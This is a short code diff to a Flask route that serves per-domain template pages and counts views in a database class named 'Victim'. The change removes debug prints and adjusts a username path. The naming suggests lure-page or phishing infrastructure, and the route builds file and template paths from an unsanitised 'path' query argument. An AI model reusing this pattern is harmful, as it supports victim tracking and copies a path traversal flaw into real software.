@@ -47,27 +47,22 @@ def index():
     if host == server_domain:
         return redirect(url_for('panel'))
     else:
-        print('I am here')
-        try:
-            
-            print(request.args)
 
+        try:
             path = request.args.get('path')
-            print(path)
             url = host + '$' + path
             username = os.listdir(f'templates/domains/{url}/')[0]
-            
+            db_username = username.replace(".html", "")
 
-            print(session)
-            print(host)
+
 
             if not 'entered' in session:
                 session['entered'] = True
-                db_victim = Victim(f'./users/{username}/database.db')
+                db_victim = Victim(f'./users/{db_username}/database.db')
                 db_victim.AddView(host)
             else:
                 session.pop('entered')
-            print('I am here3')
+
 
 
             return render_template(f'domains/{url}/{username}')
